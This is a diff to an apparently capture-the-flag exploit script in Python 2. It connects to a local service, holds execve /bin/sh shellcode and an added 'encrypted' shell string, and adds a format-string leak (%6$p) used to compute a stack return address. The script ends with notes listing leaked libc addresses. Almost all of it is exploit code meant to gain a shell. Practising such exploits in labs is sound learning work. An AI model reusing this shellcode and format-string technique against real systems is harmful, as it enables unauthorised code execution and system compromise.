@@ -17,6 +17,7 @@ host = '0'
 s.connect((host, 9012))
 
 shellcode = "\x31\xC0\x99\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x31\xF6\xB0\x3B\x0F\x05"
+shell_encrypted = "fb2300006c3e0000882b0000c71f0000ab170000e72c0000341f0000cd2800007c39000042050000c1190000a3090000210c0000c71f0000183f0000202e0000621d0000f32a00000d150000fb23000035220000e83c000013320000013a0000320f0000"
 
 def recvall():
     out = ""
@@ -107,11 +108,26 @@ def main():
     recvuntil('> ')
     setkey()
     # %76$p es mi input
-    print hex(leak_addr(0x602060)) # sprintf
-
+    #print hex(leak_addr(0x00602030))
+    leak = run('%6$p   ')[2:]
+    stack_addr = int(leak, 16)
+    print hex(stack_addr)
+    ret_addr = stack_addr + 0x638
+    interactive()
 
 if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
         pass
+
+"""
+sprintf 0x7f69ed936940
+putchar 0x7f9457ee5290
+puts    0x7f7d522c0690
+fgetc   0x7fc476251030
+
+no encontre que libc usa...
+"""
+leak    : 0x7fff9765cda0
+ret addr :0x7fff9765d3d8
